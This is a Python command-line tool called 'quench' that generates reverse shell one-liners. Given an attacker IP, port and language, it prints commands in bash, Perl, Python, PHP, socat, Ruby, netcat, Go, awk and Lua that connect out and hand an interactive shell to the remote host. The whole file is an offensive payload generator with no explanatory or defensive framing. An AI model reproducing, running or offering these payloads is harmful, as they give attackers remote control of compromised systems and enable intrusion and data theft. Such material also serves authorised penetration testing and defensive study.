#!/usr/bin/env python
import sys
import getopt

def main(argv):

   help = """Usage: quench -i, --ip <IP Address> -p, --port <Port Number> -t, --type <Payload Type>\nPayload Types: sh, pl, py, socat, php, rb, nc, go, awk, lua"""
   ip = ''
   port = ''
   type = ''

   try:
      opts, args = getopt.getopt(argv,"i:p:t:",["ip=","port=","type="])
   except getopt.GetoptError:
      print(help)
      sys.exit(2)

   for opt, arg in opts:
      if opt in ("-i", "--ip"):
        ip = arg
      elif opt in ("-p", "--port"):
        port = arg

      if opt in ("-t", "--type"):
        type = arg
        if type == "sh":
            print("""BASH-TCP ==> bash -i >& /dev/tcp/%s/%s 0>&1""" %(ip,port))
            print("""BASH-TCP ==> 0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196""" %(ip, port))
            print("""BASH-UDP ==> bash -i >& /dev/udp/%s/%s 0>&1""" %(ip,port))
            print("""BASH-UDP ==> 0<&196;exec 196<>/dev/udp/%s/%s; sh <&196 >&196 2>&196""" %(ip,port))
        elif type == "pl":
            print("""PERL ==> perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" %(ip,port))
            print("""PERL ==> perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""" %(ip,port))
        elif type == "py":
            print("""PYTHON-IPV4 ==> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""" %(ip,port))
            print("""PYTHON-IPV4 ==> export RHOST="%s";export RPORT=%s;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""" %(ip,port))
            print("""PYTHON-IPV6 ==> python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("%s",%s,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'""" %(ip,port))
            print("""PYTHON-IPV6 ==> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" %(ip,port))
        elif type == "php":
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);shell_exec("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);`/bin/sh -i <&3 >&3 2>&3`;'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);system("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);passthru("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);popen("/bin/sh -i <&3 >&3 2>&3", "r");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""" %(ip,port))
        elif type == "socat":
            print("""SOCAT ==> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s""" %(ip,port))
        elif type == "rb":
            print("""RUBY ==> ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["%s"],ENV["%s"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' """ %(ip,port))
        elif type == "nc":
            print("""NETCAT-TCP ==> nc %s %s -e /bin/bash""" %(ip,port))
            print("""NETCAT-UDP ==> nc --udp %s %s -e /bin/bash""" %(ip,port))
        elif type == "go":
            print("""GOLANG ==> echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""" %(ip,port))
        elif type == "awk":
            print("""AWK ==> awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""" %(ip,port))
        elif type == "lua":
            print("""LUA ==> lua -e "require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');" """ %(ip,port))
        else:
            print("You entered invalid payload type. You must to use one of these ==> sh, pl, py, socat, php, rb, nc, go, awk, lua")

if __name__ == "__main__":
   main(sys.argv[1:])